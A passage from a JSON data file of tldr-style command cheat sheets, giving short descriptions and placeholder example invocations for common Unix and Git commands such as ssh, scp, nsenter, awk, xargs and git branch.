    "nsenter": "# nsenter\n> Run a new command in a running process' namespace. Particularly useful for\n> docker images or chroot jails. More information: https://manned.org/nsenter.\n  * Run a specific command using the same namespaces as an existing process:\n`nsenter --target {{pid}} --all {{command}} {{command_arguments}}`\n  * Run a specific command in an existing process's network namespace:\n`nsenter --target {{pid}} --net {{command}} {{command_arguments}}`\n  * Run a specific command in an existing process's PID namespace:\n`nsenter --target {{pid}} --pid {{command}} {{command_arguments}}`\n  * Run a specific command in an existing process's IPC namespace:\n`nsenter --target {{pid}} --ipc {{command}} {{command_arguments}}`\n  * Run a specific command in an existing process's UTS, time, and IPC namespaces:\n`nsenter --target {{pid}} --uts --time --ipc -- {{command}}\n{{command_arguments}}`\n  * Run a specific command in an existing process's namespace by referencing procfs:\n`nsenter --pid=/proc/{{pid}}/pid/net -- {{command}} {{command_arguments}}`",
    "scp": "# scp\n> Secure copy. Copy files between hosts using Secure Copy Protocol over SSH.\n> More information: https://man.openbsd.org/scp.\n  * Copy a local file to a remote host:\n`scp {{path/to/local_file}} {{remote_host}}:{{path/to/remote_file}}`\n  * Use a specific port when connecting to the remote host:\n`scp -P {{port}} {{path/to/local_file}}\n{{remote_host}}:{{path/to/remote_file}}`\n  * Copy a file from a remote host to a local directory:\n`scp {{remote_host}}:{{path/to/remote_file}} {{path/to/local_directory}}`\n  * Recursively copy the contents of a directory from a remote host to a local directory:\n`scp -r {{remote_host}}:{{path/to/remote_directory}}\n{{path/to/local_directory}}`\n  * Copy a file between two remote hosts transferring through the local host:\n`scp -3 {{host1}}:{{path/to/remote_file}}\n{{host2}}:{{path/to/remote_directory}}`\n  * Use a specific username when connecting to the remote host:\n`scp {{path/to/local_file}}\n{{remote_username}}@{{remote_host}}:{{path/to/remote_directory}}`\n  * Use a specific ssh private key for authentication with the remote host:\n`scp -i {{~/.ssh/private_key}} {{local_file}}\n{{remote_host}}:{{/path/remote_file}}`",
    "write": "# write\n> Write a message on the terminal of a specified logged in user (ctrl-C to\n> stop writing messages). Use the `who` command to find out all terminal_ids\n> of all active users active on the system. See also `mesg`. More information:\n> https://manned.org/write.\n  * Send a message to a given user on a given terminal id:\n`write {{username}} {{terminal_id}}`\n  * Send message to \"testuser\" on terminal `/dev/tty/5`:\n`write {{testuser}} {{tty/5}}`\n  * Send message to \"johndoe\" on pseudo terminal `/dev/pts/5`:\n`write {{johndoe}} {{pts/5}}`",
    "systemd-cat": "# systemd-cat\n> Connect a pipeline or program's output streams with the systemd journal.\n> More information: https://www.freedesktop.org/software/systemd/man/systemd-\n> cat.html.\n  * Write the output of the specified command to the journal (both output streams are captured):\n`systemd-cat {{command}}`\n  * Write the output of a pipeline to the journal (`stderr` stays connected to the terminal):\n`{{command}} | systemd-cat`",
    "git-rev-parse": "# git rev-parse\n> Display metadata related to specific revisions. More information:\n> https://git-scm.com/docs/git-rev-parse.\n  * Get the commit hash of a branch:\n`git rev-parse {{branch_name}}`\n  * Get the current branch name:\n`git rev-parse --abbrev-ref {{HEAD}}`\n  * Get the absolute path to the root directory:\n`git rev-parse --show-toplevel`",
    "size": "# size\n> Displays the sizes of sections inside binary files. More information:\n> https://sourceware.org/binutils/docs/binutils/size.html.\n  * Display the size of sections in a given object or executable file:\n`size {{path/to/file}}`\n  * Display the size of sections in a given object or executable file in [o]ctal:\n`size {{-o|--radix=8}} {{path/to/file}}`\n  * Display the size of sections in a given object or executable file in [d]ecimal:\n`size {{-d|--radix=10}} {{path/to/file}}`\n  * Display the size of sections in a given object or executable file in he[x]adecimal:\n`size {{-x|--radix=16}} {{path/to/file}}`",
    "column": "# column\n> Format `stdin` or a file into multiple columns. Columns are filled before\n> rows; the default separator is a whitespace. More information:\n> https://manned.org/column.\n  * Format the output of a command for a 30 characters wide display:\n`printf \"header1 header2\\nbar foo\\n\" | column --output-width {{30}}`\n  * Split columns automatically and auto-align them in a tabular format:\n`printf \"header1 header2\\nbar foo\\n\" | column --table`\n  * Specify the column delimiter character for the `--table` option (e.g. \",\" for CSV) (defaults to whitespace):\n`printf \"header1,header2\\nbar,foo\\n\" | column --table --separator {{,}}`\n  * Fill rows before filling columns:\n`printf \"header1\\nbar\\nfoobar\\n\" | column --output-width {{30}} --fillrows`",
    "seq": "# seq\n> Output a sequence of numbers to `stdout`. More information:\n> https://www.gnu.org/software/coreutils/seq.\n  * Sequence from 1 to 10:\n`seq 10`\n  * Every 3rd number from 5 to 20:\n`seq 5 3 20`\n  * Separate the output with a space instead of a newline:\n`seq -s \" \" 5 3 20`\n  * Format output width to a minimum of 4 digits padding with zeros as necessary:\n`seq -f \"%04g\" 5 3 20`",
    "fmt": "# fmt\n> Reformat a text file by joining its paragraphs and limiting the line width\n> to given number of characters (75 by default). More information:\n> https://www.gnu.org/software/coreutils/fmt.\n  * Reformat a file:\n`fmt {{path/to/file}}`\n  * Reformat a file producing output lines of (at most) `n` characters:\n`fmt -w {{n}} {{path/to/file}}`\n  * Reformat a file without joining lines shorter than the given width together:\n`fmt -s {{path/to/file}}`\n  * Reformat a file with uniform spacing (1 space between words and 2 spaces between paragraphs):\n`fmt -u {{path/to/file}}`",
    "git-stage": "# git stage\n> Add file contents to the staging area. Synonym of `git add`. More\n> information: https://git-scm.com/docs/git-stage.\n  * Add a file to the index:\n`git stage {{path/to/file}}`\n  * Add all files (tracked and untracked):\n`git stage -A`\n  * Only add already tracked files:\n`git stage -u`\n  * Also add ignored files:\n`git stage -f`\n  * Interactively stage parts of files:\n`git stage -p`\n  * Interactively stage parts of a given file:\n`git stage -p {{path/to/file}}`\n  * Interactively stage a file:\n`git stage -i`",
    "git-remote": "# git remote\n> Manage set of tracked repositories (\"remotes\"). More information:\n> https://git-scm.com/docs/git-remote.\n  * Show a list of existing remotes, their names and URL:\n`git remote -v`\n  * Show information about a remote:\n`git remote show {{remote_name}}`\n  * Add a remote:\n`git remote add {{remote_name}} {{remote_url}}`\n  * Change the URL of a remote (use `--add` to keep the existing URL):\n`git remote set-url {{remote_name}} {{new_url}}`\n  * Show the URL of a remote:\n`git remote get-url {{remote_name}}`\n  * Remove a remote:\n`git remote remove {{remote_name}}`\n  * Rename a remote:\n`git remote rename {{old_name}} {{new_name}}`",
    "whatis": "# whatis\n> Tool that searches a set of database files containing short descriptions of\n> system commands for keywords. More information:\n> http://www.linfo.org/whatis.html.\n  * Search for information about keyword:\n`whatis {{keyword}}`\n  * Search for information about multiple keywords:\n`whatis {{keyword1}} {{keyword2}}`",
    "git-grep": "# git-grep\n> Find strings inside files anywhere in a repository's history. Accepts a lot\n> of the same flags as regular `grep`. More information: https://git-\n> scm.com/docs/git-grep.\n  * Search for a string in tracked files:\n`git grep {{search_string}}`\n  * Search for a string in files matching a pattern in tracked files:\n`git grep {{search_string}} -- {{file_glob_pattern}}`\n  * Search for a string in tracked files, including submodules:\n`git grep --recurse-submodules {{search_string}}`\n  * Search for a string at a specific point in history:\n`git grep {{search_string}} {{HEAD~2}}`\n  * Search for a string across all branches:\n`git grep {{search_string}} $(git rev-list --all)`",
    "touch": "# touch\n> Create files and set access/modification times. More information:\n> https://manned.org/man/freebsd-13.1/touch.\n  * Create specific files:\n`touch {{path/to/file1 path/to/file2 ...}}`\n  * Set the file [a]ccess or [m]odification times to the current one and don't [c]reate file if it doesn't exist:\n`touch -c -{{a|m}} {{path/to/file1 path/to/file2 ...}}`\n  * Set the file [t]ime to a specific value and don't [c]reate file if it doesn't exist:\n`touch -c -t {{YYYYMMDDHHMM.SS}} {{path/to/file1 path/to/file2 ...}}`\n  * Set the file time of a specific file to the time of anothe[r] file and don't [c]reate file if it doesn't exist:\n`touch -c -r {{~/.emacs}} {{path/to/file1 path/to/file2 ...}}`",
    "pmap": "# pmap\n> Report memory map of a process or processes. More information:\n> https://manned.org/pmap.\n  * Print memory map for a specific process id (PID):\n`pmap {{pid}}`\n  * Show the extended format:\n`pmap --extended {{pid}}`\n  * Show the device format:\n`pmap --device {{pid}}`\n  * Limit results to a memory address range specified by `low` and `high`:\n`pmap --range {{low}},{{high}}`\n  * Print memory maps for multiple processes:\n`pmap {{pid1 pid2 ...}}`",
    "killall": "# killall\n> Send kill signal to all instances of a process by name (must be exact name).\n> All signals except SIGKILL and SIGSTOP can be intercepted by the process,\n> allowing a clean exit. More information: https://manned.org/killall.\n  * Terminate a process using the default SIGTERM (terminate) signal:\n`killall {{process_name}}`\n  * [l]ist available signal names (to be used without the 'SIG' prefix):\n`killall -l`\n  * Interactively ask for confirmation before termination:\n`killall -i {{process_name}}`\n  * Terminate a process using the SIGINT (interrupt) signal, which is the same signal sent by pressing `Ctrl + C`:\n`killall -INT {{process_name}}`\n  * Force kill a process:\n`killall -KILL {{process_name}}`",
    "awk": "# awk\n> A versatile programming language for working on files. More information:\n> https://github.com/onetrueawk/awk.\n  * Print the fifth column (a.k.a. field) in a space-separated file:\n`awk '{print $5}' {{path/to/file}}`\n  * Print the second column of the lines containing \"foo\" in a space-separated file:\n`awk '/{{foo}}/ {print $2}' {{path/to/file}}`\n  * Print the last column of each line in a file, using a comma (instead of space) as a field separator:\n`awk -F ',' '{print $NF}' {{path/to/file}}`\n  * Sum the values in the first column of a file and print the total:\n`awk '{s+=$1} END {print s}' {{path/to/file}}`\n  * Print every third line starting from the first line:\n`awk 'NR%3==1' {{path/to/file}}`\n  * Print different values based on conditions:\n`awk '{if ($1 == \"foo\") print \"Exact match foo\"; else if ($1 ~ \"bar\") print\n\"Partial match bar\"; else print \"Baz\"}' {{path/to/file}}`\n  * Print all lines where the 10th column value equals the specified value:\n`awk '($10 == value)'`\n  * Print all the lines which the 10th column value is between a min and a max:\n`awk '($10 >= min_value && $10 <= max_value)'`",
    "git-cherry-pick": "# git cherry-pick\n> Apply the changes introduced by existing commits to the current branch. To\n> apply changes to another branch, first use `git checkout` to switch to the\n> desired branch. More information: https://git-scm.com/docs/git-cherry-pick.\n  * Apply a commit to the current branch:\n`git cherry-pick {{commit}}`\n  * Apply a range of commits to the current branch (see also `git rebase --onto`):\n`git cherry-pick {{start_commit}}~..{{end_commit}}`\n  * Apply multiple (non-sequential) commits to the current branch:\n`git cherry-pick {{commit_1}} {{commit_2}}`\n  * Add the changes of a commit to the working directory, without creating a commit:\n`git cherry-pick --no-commit {{commit}}`",
    "git-branch": "# git branch\n> Main Git command for working with branches. More information: https://git-\n> scm.com/docs/git-branch.\n  * List all branches (local and remote; the current branch is highlighted by `*`):\n`git branch --all`\n  * List which branches include a specific Git commit in their history:\n`git branch --all --contains {{commit_hash}}`\n  * Show the name of the current branch:\n`git branch --show-current`\n  * Create new branch based on the current commit:\n`git branch {{branch_name}}`\n  * Create new branch based on a specific commit:\n`git branch {{branch_name}} {{commit_hash}}`\n  * Rename a branch (must not have it checked out to do this):\n`git branch -m {{old_branch_name}} {{new_branch_name}}`\n  * Delete a local branch (must not have it checked out to do this):\n`git branch -d {{branch_name}}`\n  * Delete a remote branch:\n`git push {{remote_name}} --delete {{remote_branch_name}}`",
    "base64": "# base64\n> Encode and decode using Base64 representation. More information:\n> https://www.unix.com/man-page/osx/1/base64/.\n  * Encode a file:\n`base64 --input={{plain_file}}`\n  * Decode a file:\n`base64 --decode --input={{base64_file}}`\n  * Encode from `stdin`:\n`echo -n \"{{plain_text}}\" | base64`\n  * Decode from `stdin`:\n`echo -n {{base64_text}} | base64 --decode`",
    "type": "# type\n> Display the type of command the shell will execute. More information:\n> https://manned.org/type.\n  * Display the type of a command:\n`type {{command}}`\n  * Display all locations containing the specified executable:\n`type -a {{command}}`\n  * Display the name of the disk file that would be executed:\n`type -p {{command}}`",
    "ul": "# ul\n> Performs the underlining of a text. Each character in a given string must be\n> underlined separately. More information: https://manned.org/ul.\n  * Display the contents of the file with underlines where applicable:\n`ul {{file.txt}}`\n  * Display the contents of the file with underlines made of dashes `-`:\n`ul -i {{file.txt}}`",
    "ldd": "# ldd\n> Display shared library dependencies of a binary. Do not use on an untrusted\n> binary, use objdump for that instead. More information:\n> https://manned.org/ldd.\n  * Display shared library dependencies of a binary:\n`ldd {{path/to/binary}}`\n  * Display all information about dependencies:\n`ldd --verbose {{path/to/binary}}`\n  * Display unused direct dependencies:\n`ldd --unused {{path/to/binary}}`\n  * Report missing data objects and perform data relocations:\n`ldd --data-relocs {{path/to/binary}}`\n  * Report missing data objects and functions, and perform relocations for both:\n`ldd --function-relocs {{path/to/binary}}`",
    "git-gc": "# git gc\n> Optimise the local repository by cleaning unnecessary files. More\n> information: https://git-scm.com/docs/git-gc.\n  * Optimise the repository:\n`git gc`\n  * Aggressively optimise, takes more time:\n`git gc --aggressive`\n  * Do not prune loose objects (prunes by default):\n`git gc --no-prune`\n  * Suppress all output:\n`git gc --quiet`\n  * View full usage:\n`git gc --help`",
    "git-diff": "# git diff\n> Show changes to tracked files. More information: https://git-\n> scm.com/docs/git-diff.\n  * Show unstaged, uncommitted changes:\n`git diff`\n  * Show all uncommitted changes (including staged ones):\n`git diff HEAD`\n  * Show only staged (added, but not yet committed) changes:\n`git diff --staged`\n  * Show changes from all commits since a given date/time (a date expression, e.g. \"1 week 2 days\" or an ISO date):\n`git diff 'HEAD@{3 months|weeks|days|hours|seconds ago}'`\n  * Show only names of changed files since a given commit:\n`git diff --name-only {{commit}}`\n  * Output a summary of file creations, renames and mode changes since a given commit:\n`git diff --summary {{commit}}`\n  * Compare a single file between two branches or commits:\n`git diff {{branch_1}}..{{branch_2}} [--] {{path/to/file}}`\n  * Compare different files from the current branch to other branch:\n`git diff {{branch}}:{{path/to/file2}} {{path/to/file}}`",
    "renice": "# renice\n> Alters the scheduling priority/niceness of one or more running processes.\n> Niceness values range from -20 (most favorable to the process) to 19 (least\n> favorable to the process). More information: https://manned.org/renice.\n  * Change priority of a running process:\n`renice -n {{niceness_value}} -p {{pid}}`\n  * Change priority of all processes owned by a user:\n`renice -n {{niceness_value}} -u {{user}}`\n  * Change priority of all processes that belong to a process group:\n`renice -n {{niceness_value}} --pgrp {{process_group}}`",
    "comm": "# comm\n> Select or reject lines common to two files. Both files must be sorted. More\n> information: https://www.gnu.org/software/coreutils/comm.\n  * Produce three tab-separated columns: lines only in first file, lines only in second file and common lines:\n`comm {{file1}} {{file2}}`\n  * Print only lines common to both files:\n`comm -12 {{file1}} {{file2}}`\n  * Print only lines common to both files, reading one file from `stdin`:\n`cat {{file1}} | comm -12 - {{file2}}`\n  * Get lines only found in first file, saving the result to a third file:\n`comm -23 {{file1}} {{file2}} > {{file1_only}}`\n  * Print lines only found in second file, when the files aren't sorted:\n`comm -13 <(sort {{file1}}) <(sort {{file2}})`",
    "git-tag": "# git tag\n> Create, list, delete or verify tags. A tag is a static reference to a\n> specific commit. More information: https://git-scm.com/docs/git-tag.\n  * List all tags:\n`git tag`\n  * Create a tag with the given name pointing to the current commit:\n`git tag {{tag_name}}`\n  * Create a tag with the given name pointing to a given commit:\n`git tag {{tag_name}} {{commit}}`\n  * Create an annotated tag with the given message:\n`git tag {{tag_name}} -m {{tag_message}}`\n  * Delete the tag with the given name:\n`git tag -d {{tag_name}}`\n  * Get updated tags from upstream:\n`git fetch --tags`\n  * List all tags whose ancestors include a given commit:\n`git tag --contains {{commit}}`",
    "git-fetch": "# git fetch\n> Download objects and refs from a remote repository. More information:\n> https://git-scm.com/docs/git-fetch.\n  * Fetch the latest changes from the default remote upstream repository (if set):\n`git fetch`\n  * Fetch new branches from a specific remote upstream repository:\n`git fetch {{remote_name}}`\n  * Fetch the latest changes from all remote upstream repositories:\n`git fetch --all`\n  * Also fetch tags from the remote upstream repository:\n`git fetch --tags`\n  * Delete local references to remote branches that have been deleted upstream:\n`git fetch --prune`",
    "xargs": "# xargs\n> Execute a command with piped arguments coming from another command, a file,\n> etc. The input is treated as a single block of text and split into separate\n> pieces on spaces, tabs, newlines and end-of-file. More information:\n> https://pubs.opengroup.org/onlinepubs/9699919799/utilities/xargs.html.\n  * Run a command using the input data as arguments:\n`{{arguments_source}} | xargs {{command}}`\n  * Run multiple chained commands on the input data:\n`{{arguments_source}} | xargs sh -c \"{{command1}} && {{command2}} |\n{{command3}}\"`\n  * Delete all files with a `.backup` extension (`-print0` uses a null character to split file names, and `-0` uses it as delimiter):\n`find . -name {{'*.backup'}} -print0 | xargs -0 rm -v`\n  * Execute the command once for each input line, replacing any occurrences of the placeholder (here marked as `_`) with the input line:\n`{{arguments_source}} | xargs -I _ {{command}} _ {{optional_extra_arguments}}`\n  * Parallel runs of up to `max-procs` processes at a time; the default is 1. If `max-procs` is 0, xargs will run as many processes as possible at a time:\n`{{arguments_source}} | xargs -P {{max-procs}} {{command}}`",
    "jobs": "# jobs\n> Display status of jobs in the current session. More information:\n> https://manned.org/jobs.\n  * Show status of all jobs:\n`jobs`\n  * Show status of a particular job:\n`jobs %{{job_id}}`\n  * Show status and process IDs of all jobs:\n`jobs -l`\n  * Show process IDs of all jobs:\n`jobs -p`",
    "git-worktree": "# git worktree\n> Manage multiple working trees attached to the same repository. More\n> information: https://git-scm.com/docs/git-worktree.\n  * Create a new directory with the specified branch checked out into it:\n`git worktree add {{path/to/directory}} {{branch}}`\n  * Create a new directory with a new branch checked out into it:\n`git worktree add {{path/to/directory}} -b {{new_branch}}`\n  * List all the working directories attached to this repository:\n`git worktree list`\n  * Remove a worktree (after deleting worktree directory):\n`git worktree prune`",
    "git-cvsexportcommit": "# git cvsexportcommit\n> Export a single `Git` commit to a CVS checkout. More information:\n> https://git-scm.com/docs/git-cvsexportcommit.\n  * Merge a specific patch into CVS:\n`git cvsexportcommit -v -c -w {{path/to/project_cvs_checkout}}\n{{commit_sha1}}`",
    "dir": "# dir\n> List directory contents using one line per file, special characters are\n> represented by backslash escape sequences. Works as `ls -C --escape`. More\n> information: https://manned.org/dir.\n  * List all files, including hidden files:\n`dir -all`\n  * List files including their author (`-l` is required):\n`dir -l --author`\n  * List files excluding those that match a specified blob pattern:\n`dir --hide={{pattern}}`\n  * List subdirectories recursively:\n`dir --recursive`\n  * Display help:\n`dir --help`",
    "cd": "# cd\n> Change the current working directory. More information:\n> https://manned.org/cd.\n  * Go to the specified directory:\n`cd {{path/to/directory}}`\n  * Go up to the parent of the current directory:\n`cd ..`\n  * Go to the home directory of the current user:\n`cd`\n  * Go to the home directory of the specified user:\n`cd ~{{username}}`\n  * Go to the previously chosen directory:\n`cd -`\n  * Go to the root directory:\n`cd /`",
    "git-revert": "# git revert\n> Create new commits which reverse the effect of earlier ones. More\n> information: https://git-scm.com/docs/git-revert.\n  * Revert the most recent commit:\n`git revert {{HEAD}}`\n  * Revert the 5th last commit:\n`git revert HEAD~{{4}}`\n  * Revert a specific commit:\n`git revert {{0c01a9}}`\n  * Revert multiple commits:\n`git revert {{branch_name~5..branch_name~2}}`\n  * Don't create new commits, just change the working tree:\n`git revert -n {{0c01a9..9a1743}}`",
    "git-ls-tree": "# git ls-tree\n> List the contents of a tree object. More information: https://git-\n> scm.com/docs/git-ls-tree.\n  * List the contents of the tree on a branch:\n`git ls-tree {{branch_name}}`\n  * List the contents of the tree on a commit, recursing into subtrees:\n`git ls-tree -r {{commit_hash}}`\n  * List only the filenames of the tree on a commit:\n`git ls-tree --name-only {{commit_hash}}`",
    "ssh": "# ssh\n> Secure Shell is a protocol used to securely log onto remote systems. It can\n> be used for logging or executing commands on a remote server. More\n> information: https://man.openbsd.org/ssh.\n  * Connect to a remote server:\n`ssh {{username}}@{{remote_host}}`\n  * Connect to a remote server with a specific identity (private key):\n`ssh -i {{path/to/key_file}} {{username}}@{{remote_host}}`\n  * Connect to a remote server using a specific port:\n`ssh {{username}}@{{remote_host}} -p {{2222}}`\n  * Run a command on a remote server with a [t]ty allocation allowing interaction with the remote command:\n`ssh {{username}}@{{remote_host}} -t {{command}} {{command_arguments}}`\n  * SSH tunneling: Dynamic port forwarding (SOCKS proxy on `localhost:1080`):\n`ssh -D {{1080}} {{username}}@{{remote_host}}`\n  * SSH tunneling: Forward a specific port (`localhost:9999` to `example.org:80`) along with disabling pseudo-[T]ty allocation and executio[N] of remote commands:\n`ssh -L {{9999}}:{{example.org}}:{{80}} -N -T {{username}}@{{remote_host}}`\n  * SSH jumping: Connect through a jumphost to a remote server (Multiple jump hops may be specified separated by comma characters):\n`ssh -J {{username}}@{{jump_host}} {{username}}@{{remote_host}}`\n  * Agent forwarding: Forward the authentication information to the remote machine (see `man ssh_config` for available options):\n`ssh -A {{username}}@{{remote_host}}`",
    "taskset": "# taskset\n> Get or set a process' CPU affinity or start a new process with a defined CPU\n> affinity. More information: https://manned.org/taskset.\n  * Get a running process' CPU affinity by PID:\n`taskset --pid --cpu-list {{pid}}`\n  * Set a running process' CPU affinity by PID:\n`taskset --pid --cpu-list {{cpu_id}} {{pid}}`\n  * Start a new process with affinity for a single CPU:\n`taskset --cpu-list {{cpu_id}} {{command}}`\n  * Start a new process with affinity for multiple non-sequential CPUs:\n`taskset --cpu-list {{cpu_id_1}},{{cpu_id_2}},{{cpu_id_3}}`\n  * Start a new process with affinity for CPUs 1 through 4:\n`taskset --cpu-list {{cpu_id_1}}-{{cpu_id_4}}`",
    "chown": "# chown\n> Change user and group ownership of files and directories. More information:\n> https://www.gnu.org/software/coreutils/chown.\n  * Change the owner user of a file/directory:\n`chown {{user}} {{path/to/file_or_directory}}`\n  * Change the owner user and group of a file/directory:\n`chown {{user}}:{{group}} {{path/to/file_or_directory}}`\n  * Recursively change the owner of a directory and its contents:\n`chown -R {{user}} {{path/to/directory}}`\n  * Change the owner of a symbolic link:\n`chown -h {{user}} {{path/to/symlink}}`\n  * Change the owner of a file/directory to match a reference file:\n`chown --reference={{path/to/reference_file}} {{path/to/file_or_directory}}`",
    "cp": "# cp\n> Copy files and directories. More information:\n> https://www.gnu.org/software/coreutils/cp.\n  * Copy a file to another location:\n`cp {{path/to/source_file.ext}} {{path/to/target_file.ext}}`\n  * Copy a file into another directory, keeping the filename:\n`cp {{path/to/source_file.ext}} {{path/to/target_parent_directory}}`\n  * Recursively copy a directory's contents to another location (if the destination exists, the directory is copied inside it):\n`cp -R {{path/to/source_directory}} {{path/to/target_directory}}`\n  * Copy a directory recursively, in verbose mode (shows files as they are copied):\n`cp -vR {{path/to/source_directory}} {{path/to/target_directory}}`\n  * Copy multiple files at once to a directory:\n`cp -t {{path/to/destination_directory}} {{path/to/file1 path/to/file2 ...}}`\n  * Copy text files to another location, in interactive mode (prompts user before overwriting):\n`cp -i {{*.txt}} {{path/to/target_directory}}`\n  * Follow symbolic links before copying:\n`cp -L {{link}} {{path/to/target_directory}}`\n  * Use the first argument as the destination directory (useful for `xargs ... | cp -t <DEST_DIR>`):\n`cp -t {{path/to/target_directory}} {{path/to/file_or_directory1\npath/to/file_or_directory2 ...}}`",
    "rename": "# rename\n> Rename a file or group of files with a regular expression. More information:\n> https://www.manpagez.com/man/2/rename/.\n  * Replace `from` with `to` in the filenames of the specified files:\n`rename 's/{{from}}/{{to}}/' {{*.txt}}`",
    "wall": "# wall\n> Write a message on the terminals of users currently logged in. More\n> information: https://manned.org/wall.\n  * Send a message:\n`wall {{message}}`\n  * Send a message to users that belong to a specific group:\n`wall --group {{group_name}} {{message}}`\n  * Send a message from a file:\n`wall {{file}}`\n  * Send a message with timeout (default 300):\n`wall --timeout {{seconds}} {{file}}`",
    "stat": "# stat\n> Display file status. More information: https://ss64.com/osx/stat.html.\n  * Show file properties such as size, permissions, creation and access dates among others:\n`stat {{path/to/file}}`\n  * Same as above but verbose (more similar to Linux's `stat`):\n`stat -x {{path/to/file}}`\n  * Show only octal file permissions:\n`stat -f %Mp%Lp {{path/to/file}}`\n  * Show owner and group of the file:\n`stat -f \"%Su %Sg\" {{path/to/file}}`\n  * Show the size of the file in bytes:\n`stat -f \"%z %N\" {{path/to/file}}`",
    "ar": "# ar\n> Create, modify, and extract from Unix archives. Typically used for static\n> libraries (`.a`) and Debian packages (`.deb`). See also: `tar`. More\n> information: https://manned.org/ar.\n  * E[x]tract all members from an archive:\n`ar x {{path/to/file.a}}`\n  * Lis[t] contents in a specific archive:\n`ar t {{path/to/file.ar}}`\n  * [r]eplace or add specific files to an archive:\n`ar r {{path/to/file.deb}} {{path/to/debian-binary path/to/control.tar.gz\npath/to/data.tar.xz ...}}`\n  * In[s]ert an object file index (equivalent to using `ranlib`):\n`ar s {{path/to/file.a}}`\n  * Create an archive with specific files and an accompanying object file index:\n`ar rs {{path/to/file.a}} {{path/to/file1.o path/to/file2.o ...}}`",
    "git": "# git\n> Distributed version control system. Some subcommands such as `commit`,\n> `add`, `branch`, `checkout`, `push`, etc. have their own usage\n> documentation, accessible via `tldr git subcommand`. More information:\n> https://git-scm.com/.\n  * Check the Git version:\n`git --version`\n  * Show general help:\n`git --help`\n  * Show help on a Git subcommand (like `clone`, `add`, `push`, `log`, etc.):\n`git help {{subcommand}}`\n  * Execute a Git subcommand:\n`git {{subcommand}}`\n  * Execute a Git subcommand on a custom repository root path:\n`git -C {{path/to/repo}} {{subcommand}}`\n  * Execute a Git subcommand with a given configuration set:\n`git -c '{{config.key}}={{value}}' {{subcommand}}`",
    "pax": "# pax\n> Archiving and copying utility. More information: https://manned.org/pax.1p.\n  * List the contents of an archive:\n`pax -f {{archive.tar}}`\n  * List the contents of a gzipped archive:\n`pax -zf {{archive.tar.gz}}`\n  * Create an archive from files:\n`pax -wf {{target.tar}} {{path/to/file1}} {{path/to/file2}} {{path/to/file3}}`\n  * Create an archive from files, using output redirection:\n`pax -w {{path/to/file1}} {{path/to/file2}} {{path/to/file3}} >\n{{target.tar}}`\n  * Extract an archive into the current directory:\n`pax -rf {{source.tar}}`\n  * Copy to a directory, while keeping the original metadata; `target/` must exist:\n`pax -rw {{path/to/file1}} {{path/to/directory1}} {{path/to/directory2}}\n{{target/}}`",
    "git-replace": "# git replace\n> Create, list, and delete refs to replace objects. More information:\n> https://git-scm.com/docs/git-replace.\n  * Replace any commit with a different one, leaving other commits unchanged:\n`git replace {{object}} {{replacement}}`\n  * Delete existing replace refs for the given objects:\n`git replace --delete {{object}}`\n  * Edit an object\u2019s content interactively:\n`git replace --edit {{object}}`",
    "yes": "# yes\n> Output something repeatedly. This command is commonly used to answer yes to\n> every prompt by install commands (such as apt-get). More information:\n> https://www.gnu.org/software/coreutils/yes.\n  * Repeatedly output \"message\":\n`yes {{message}}`\n  * Repeatedly output \"y\":\n`yes`\n  * Accept everything prompted by the `apt-get` command:\n`yes | sudo apt-get install {{program}}`",
    "ipcrm": "# ipcrm\n> Delete IPC (Inter-process Communication) resources. More information:\n> https://manned.org/ipcrm.\n  * Delete a shared memory segment by ID:\n`ipcrm --shmem-id {{shmem_id}}`\n  * Delete a shared memory segment by key:\n`ipcrm --shmem-key {{shmem_key}}`\n  * Delete an IPC queue by ID:\n`ipcrm --queue-id {{ipc_queue_id}}`\n  * Delete an IPC queue by key:\n`ipcrm --queue-key {{ipc_queue_key}}`\n  * Delete a semaphore by ID:\n`ipcrm --semaphore-id {{semaphore_id}}`\n  * Delete a semaphore by key:\n`ipcrm --semaphore-key {{semaphore_key}}`\n  * Delete all IPC resources:\n`ipcrm --all`",
    "git-help": "# git help\n> Display help information about Git. More information: https://git-\n> scm.com/docs/git-help.\n  * Display help about a specific Git subcommand:\n`git help {{subcommand}}`\n  * Display help about a specific Git subcommand in a web browser:\n`git help --web {{subcommand}}`\n  * Display a list of all available Git subcommands:\n`git help --all`\n  * List the available guides:\n`git help --guide`\n  * List all possible configuration variables:\n`git help --config`",
    "md5sum": "# md5sum\n> Calculate MD5 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/md5sum.\n  * Calculate the MD5 checksum for one or more files:\n`md5sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of MD5 checksums to a file:\n`md5sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.md5}}`\n  * Calculate an MD5 checksum from `stdin`:\n`{{command}} | md5sum`\n  * Read a file of MD5 sums and filenames and verify all files have matching checksums:\n`md5sum --check {{path/to/file.md5}}`\n  * Only show a message for missing files or when verification fails:\n`md5sum --check --quiet {{path/to/file.md5}}`\n  * Only show a message when verification fails, ignoring missing files:\n`md5sum --ignore-missing --check --quiet {{path/to/file.md5}}`",
    "groff": "# groff\n> GNU replacement for the `troff` and `nroff` typesetting utilities. More\n> information: https://www.gnu.org/software/groff.\n  * Format output for a PostScript printer, saving the output to a file:\n`groff {{path/to/input.roff}} > {{path/to/output.ps}}`\n  * Render a man page using the ASCII output device, and display it using a pager:\n`groff -man -T ascii {{path/to/manpage.1}} | less --RAW-CONTROL-CHARS`\n  * Render a man page into an HTML file:\n`groff -man -T html {{path/to/manpage.1}} > {{path/to/manpage.html}}`\n  * Typeset a roff file containing [t]ables and [p]ictures, using the [me] macro set, to PDF, saving the output:\n`groff {{-t}} {{-p}} -{{me}} -T {{pdf}} {{path/to/input.me}} >\n{{path/to/output.pdf}}`\n  * Run a `groff` command with preprocessor and macro options guessed by the `grog` utility:\n`eval \"$(grog -T utf8 {{path/to/input.me}})\"`",
    "git-checkout-index": "# git checkout-index\n> Copy files from the index to the working tree. More information:\n> https://git-scm.com/docs/git-checkout-index.\n  * Restore any files deleted since the last commit:\n`git checkout-index --all`\n  * Restore any files deleted or changed since the last commit:\n`git checkout-index --all --force`\n  * Restore any files changed since the last commit, ignoring any files that were deleted:\n`git checkout-index --all --force --no-create`\n  * Export a copy of the entire tree at the last commit to the specified directory (the trailing slash is important):\n`git checkout-index --all --force --prefix={{path/to/export_directory/}}`",
